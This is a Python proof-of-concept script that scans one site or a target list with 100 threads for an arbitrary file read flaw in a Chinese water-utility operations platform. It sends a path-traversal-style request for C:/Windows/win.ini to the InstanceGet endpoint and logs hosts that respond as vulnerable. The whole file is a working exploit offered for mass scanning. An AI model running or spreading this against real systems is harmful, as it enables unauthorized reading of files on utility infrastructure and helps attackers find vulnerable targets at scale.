import argparse,sys,requests
from multiprocessing.dummy import Pool # 多线程的库
import urllib3
import warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)



def main():
    prase=argparse.ArgumentParser(description="森鑫炬水务企业综合运营平台 InstanceGet 存在任意文件读取")
    prase.add_argument('-u','--url',dest='url',type=str,help='please input your link')
    prase.add_argument('-f','--file',dest='file',type=str,help='please input your file')
    arge=prase.parse_args()
    if arge.url and not arge.file:
        poc(arge.url)
    elif arge.file and not arge.url:
        url_list=[]
        with open(arge.file,'r',encoding='utf-8')as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp=Pool(100)
        mp.map(poc,url_list)
        mp.close
        mp.join
    else:
        print(f"Usage python {sys.argv[0]} -h ")


def poc(target):
    link="/Forms/Instance/Get?file=C:/Windows/win.ini"
    headers={
        "Accept-Encoding": "gzip, deflate",
        "Upgrade-Insecure-Requests": "1",
        "Priority": "u=0, i",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2"
    }
    try:
        res1=requests.get(url=target,headers=headers,timeout=5,verify=False)
        if res1.status_code ==200:
            res2=requests.get(url=target+link,headers=headers,timeout=5,verify=False)
            if "MAPI=1"and "[extensions]" in res2.text:
                print(f"[+]网站{target}存在任意文件读取")
                with open('output2.txt','a',encoding='utf-8')as fp:
                    fp.write(f"[+]网站{target}存在任意文件读取")
            else:
                print(f"[-]网站{target}不存在任意文件读取")
    except:
        print(f"[*]网站存在问题，请手工测试")


if __name__ == "__main__":
    main()